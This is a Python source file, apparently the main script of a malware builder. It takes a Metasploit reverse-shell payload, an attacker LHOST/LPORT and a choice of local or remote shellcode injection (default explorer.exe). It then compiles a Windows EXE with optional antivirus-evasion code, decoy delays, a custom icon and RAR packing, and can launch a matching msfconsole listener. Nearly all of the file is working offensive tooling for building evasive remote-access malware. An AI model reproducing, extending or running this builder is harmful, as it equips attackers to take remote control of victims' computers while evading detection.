from lib import builder, compiler, compression, core, evasion, gen, metascript
import argparse
import os


types = ""
architecture = ""
payload = ""
lhost = "lhost="
lport = "lport="
filename = ""
final_code = ""
injection_type = ""
processname = ""
evasions = ""
decoys = ""
icon = ""
require_admin = ""


if __name__ == '__main__':

    # Print banner
    core.banner()
    core.check_requirements()

    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("type", help="Choose payload type", choices=["staged", "stageless"])
    parser.add_argument("architecture", help="Choose payload architecture", choices=["x86", "x64"])
    parser.add_argument("payload", help="Choose the metasploit payload (exemple: windows/x64/meterpreter/reverse_tcp)")
    parser.add_argument("lhost", help="Set your lhost (exemple: 192.168.1.60)")
    parser.add_argument("lport", help="Set your lport (exemple: 4444)")
    parser.add_argument("filename", help="Choose the name of the output file (exemple: Malware)")
    parser.add_argument("injectionType", help="Set injection method (remote only for x64 architechture)", choices=["local", "remote"])
    parser.add_argument("--procname", help="Choose process to inject shellcode for remote injection method (default/exemple: explorer.exe")
    parser.add_argument("--evasion", help="Addition of functions that allow antivirus evasion", action='store_true')
    parser.add_argument("--decoy", help="Number of decoys to add (unlimited)  -  PS : 1 decoy = 1 secondes to sleep.")
    parser.add_argument("--admin", help="Administrator privileges are required to run the program", action='store_true')
    parser.add_argument("--icon", help="Add your icon to EXE file (exemple: my_icon_name.ico)")
    parser.add_argument("--compress", help="Compress EXE file to RAR)", action='store_true')
    parser.add_argument("--mscript", help="Run pre-configured MsfConsole", action='store_true')
    args = parser.parse_args()

    # Check that required directories and path are available, if not create them
    if not os.path.isdir("./output"):
        os.makedirs("./output")
    if not os.path.isdir("./tmp"):
        os.makedirs("./tmp")

    # Staged or no
    if args.type == "staged":
        types += "YES"
    else:
        types += "NO"

    # Which architecture
    if args.architecture == "x86":
        architecture += "x86"

    else:
        architecture += "x64"

    # Add payload
    payload += str(args.payload)

    # Add lhost
    lhost += str(args.lhost)

    # Add lport
    lport += str(args.lport)

    # Add filename
    filename += "output/" + str(args.filename) + ".exe"

    # Generate shellcode
    vShellcode, decoder_stub = gen.shellcode_generation(architecture, payload, lhost, lport)

    # Set injection type
    injection_type += str(args.injectionType)

    # Compatibility check
    if injection_type == "remote":
        if architecture == "x86":
            core.error_injectionType()
            injection_type = "local"

    # Add processname
    if args.procname:
        processname += str(args.procname)

    # Add evasion code
    if args.evasion:
        evasions += "yes"

    # Add decoy code
    if args.decoy:
        decoys = str(args.decoy)

    # Build final code
    final_code += builder.exercise_room(injection_type, processname, vShellcode, decoder_stub, architecture, evasions, decoys, filename)

    # Write source code in C file.
    with open('tmp/source.c', 'w') as f:
        f.write(final_code)

    # Add icon
    if args.icon:
        icon += str(args.icon)

    if args.admin:
        require_admin = "yes"

    # Autocompilation
    compiler.auto_compile(filename, architecture, icon, require_admin)

    # Compress EXE file to RAR file
    if args.compress:
        compression.rar(filename)

    core.virustotal()

    # Run pre-configured MsfConsole
    if args.mscript:
        metascript.mscript(architecture, types, payload, lhost, lport)
